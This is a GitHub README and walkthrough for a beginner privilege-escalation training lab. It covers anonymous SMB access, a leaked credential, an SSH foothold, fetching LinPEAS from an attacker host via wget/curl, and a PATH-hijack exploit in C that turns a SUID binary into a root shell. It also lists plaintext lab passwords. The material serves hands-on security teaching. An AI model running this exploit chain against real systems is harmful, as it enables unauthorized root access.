# CorruptLabs

## Introduction

This lab is for new cyber security learners who never practice or interacted with Privilege Escalation labs and never use tools like linpeas (real_world_tool) and never perform file transfer practice. This lab help them to learn all these things at one place.

**What are the things this lab machine teachs....?**

....It teaches a complete attack chain in one place:
- SMB enumeration & anonymous share access
- Credential discovery
- SSH foothold
- SUID binary identification
- PATH hijacking against an unsafe execvp() call

> **Note:** No prior experience with LinPEAS or file-transfer techniques is assumed. The lab is intentionally simple, self-contained and isolated.

## Info for HTB

### Access

Passwords:

| User  | Password                            |
| ----- | ----------------------------------- |
| labuser | Arya123@@## |
| root  | (not needed for students; ...set your own admin password) |
|soyam-arya |(adminuser) |passwd = Arya123@@##
 ### Key Processes

1. smbd / nmbd – Samba providing the anonymous public share
2. sshd – SSH on port 22
3. (optional) ..any light HTTP service on port 80 if you keep the default Ubuntu web server

### Automation / Crons

None required. The SUID binary persists across reboots. Students create their own payload in /tmp.

### Firewall Rules

Default Ubuntu firewall (or none). No non-default rules needed.

### Docker

Not used...

### Other

- SMB share is intentionally world-readable and contains only a disposable lab credential.
- Source of the vulnerable binary is kept under a root-only directory (/root/corruptlabs/).
- Students must not have sudo.
- Snapshot the VM after validating the full chain.

# Writeup

A reader should be able to solve the box entirely by copying and pasting the commands below.

# Enumeration

**Nmap Scan**

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

Expected open ports: 22/tcp (SSH), 80/tcp (HTTP – optional), 139/445 (SMB).

<img width="1366" height="768" alt="02" src="https://github.com/user-attachments/assets/d4187737-a765-4f97-b638-669dee7297ae" />

**SMB Enumeration**

```bash
smbclient -L //<TARGET_IP> -N
smbclient //<TARGET_IP>/public -N
```

<img width="1366" height="768" alt="03" src="https://github.com/user-attachments/assets/484ad363-af46-4ba9-9d1e-c22f402aef65" />

<img width="1366" height="768" alt="04" src="https://github.com/user-attachments/assets/1cc05924-7ff2-4108-95e4-6fc5772b911c" />


Inside the SMB prompt:

<img width="1296" height="768" alt="06" src="https://github.com/user-attachments/assets/26c44cc3-be30-49a7-8282-65a41cea1076" />
```
smb: \> ls
smb: \> get old-backup.txt
smb: \> exit
```

`bash
cat old-backup.txt

<img width="1366" height="768" alt="07" src="https://github.com/user-attachments/assets/6c52164f-b044-45e3-945d-629bafb2f31d" />


```
**CorruptLabs - Confidential Backup
System User: labuser
Service: SSH
Status: Active
Credentials:
Username: labuser
Password: kali**
```

# Foothold

``bash
ssh labuser@<TARGET_IP>
# password: kali
```<img width="1366" height="768" alt="08" src="https://github.com/user-attachments/assets/79334ead-13ba-4474-9ab1-be237f92d0a0" />

```bash
cat /home/labuser/user.txt
```

User flag is obtained.

<img width="1366" height="752" alt="10" src="https://github.com/user-attachments/assets/650f3ccc-9db0-48c2-9ee6-a2a340ff20f2" />


*Optional enumeration with LinPEAS (transfer from attacker):*

**Transferring LinPEAS**

LinPEAS is optional but very useful for beginners. Below are the most common ways to get it onto the target.

Python HTTP server (very reliable). On your attacker machine:

```bash
cd /usr/share/peass/linpeas/
python3 -m http.server 8000
```
<img width="1358" height="768" alt="12" src="https://github.com/user-attachments/assets/7eaac782-68a2-4aae-a11c-d0e09207c65e" />

On the target (as labuser):

```bash
cd /tmp
wget http://<YOUR_ATTACKER_IP>:8000/linpeas.sh
# or
curl -O http://<YOUR_ATTACKER_IP>:8000/linpeas.sh

chmod +x linpeas.sh
./linpeas.sh 2>&1 | tee linpeas.out
```

<img width="1366" height="768" alt="13" src="https://github.com/user-attachments/assets/a5a46b7d-125b-407f-863c-c0edd1774409" />
<img width="1366" height="768" alt="14" src="https://github.com/user-attachments/assets/59666697-62f4-48f4-94af-89ba95a7a734" />

Optional enumeration with LinPEAS (transfer from attacker):

<img width="1366" height="768" alt="14" src="https://github.com/user-attachments/assets/4cb05043-ed36-42c7-825f-be1032ccce28" />
<img width="1366" height="768" alt="15" src="https://github.com/user-attachments/assets/fd62354c-1562-4f5c-be3c-79c48e9f0453" />
<img width="1366" height="768" alt="16a" src="https://github.com/user-attachments/assets/d05cf121-7e91-4ba7-a390-927f8606c51c" />
<img width="1366" height="768" alt="16b" src="https://github.com/user-attachments/assets/2cf1d782-59d3-4323-8f09-3b541d25f577" />



``bash
scp /usr/share/peass/linpeas/linpeas.sh labuser@<TARGET_IP>:/tmp/
ssh labuser@<TARGET_IP>
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>&1 | tee /tmp/linpeas.out


<img width="1366" height="768" alt="16c" src="https://github.com/user-attachments/assets/309a809e-0e19-4658-bcc9-532296d83985" />

**Key finding:**

```text
-rwsr-xr-x 1 root root ... /usr/local/bin/corrupt-backup
```

# Privilege Escalation

The binary calls `execvp("tar", …)` (no absolute path). Because it is SUID-root, an attacker-controlled `tar` that appears first in `PATH` runs with EUID 0.
<img width="1366" height="768" alt="17" src="https://github.com/user-attachments/assets/31243126-2f90-47c7-a445-0af33875472e" />
<img width="1366" height="768" alt="18" src="https://github.com/user-attachments/assets/e24383d5-313f-47f3-83f1-fdc0dd948201" />

**Diagnostic payload**

```bash
mkdir -p /tmp/fakebin
cat > /tmp/fakebin/tar.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
int main(void) {
    printf("PATH hijacking successful!\n");
    printf("Real UID: %d\n", getuid());
    printf("Effective UID: %d\n", geteuid());
    return 0;
}
EOF
gcc /tmp/fakebin/tar.c -o /tmp/fakebin/tar
chmod +x /tmp/fakebin/tar

PATH=/tmp/fakebin:/usr/bin:/bin /usr/local/bin/corrupt-backup
```

```text
[CorruptLabs] Starting backup
PATH hijacking successful!
Real UID: 1001
Effective UID: 0
```

<img width="1366" height="768" alt="19" src="https://github.com/user-attachments/assets/99a373fd-c88d-4d5d-9dca-423ff71f1bfe" />
<img width="1322" height="485" alt="20" src="https://github.com/user-attachments/assets/113df9ed-8599-4964-b567-c109be1f25d9" />


**Root shell payload**
<img width="1364" height="767" alt="21" src="https://github.com/user-attachments/assets/a0c1dfb1-f40d-4a1b-a8e2-854ab0c66353" />
```bash
cat > /tmp/fakebin/tar.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
int main(void) {
    if (geteuid() != 0) {
        printf("Root privileges not obtained!\n");
        return 1;
    }
    printf("[+] PATH hijacking successful!\n");
    printf("[+] Root privileges obtained!\n");
    if (setgid(0) != 0 || setuid(0) != 0) {
        perror("Failed to set root identity");
        return 1;
    }
    execl("/bin/bash", "bash", "-p", NULL);
    perror("execl");
    return 1;
}
EOF
gcc /tmp/fakebin/tar.c -o /tmp/fakebin/tar
chmod +x /tmp/fakebin/tar

PATH=/tmp/fakebin:/usr/bin:/bin /usr/local/bin/corrupt-backup
```
<img width="1366" height="768" alt="22" src="https://github.com/user-attachments/assets/d40b24d1-13d2-488e-ac4a-fe34d50130d6" />

```bash
whoami
id
cat /root/root.txt
```
**NOTE = READ THIS WORK-THROUGH IN GITHUB AND ONE MORE INFO THIS WHILE SUBMITING THIS MACHINE HTB PAGE IS NOT ACCEPT BY PASSWD OF USER AND ADMIN SO I HAVE TO WRITE IT HERE AND I HAVE TO PUT WRONG  PASSWD TO SUBMIT THIS MACHINE OR PAGE !** 
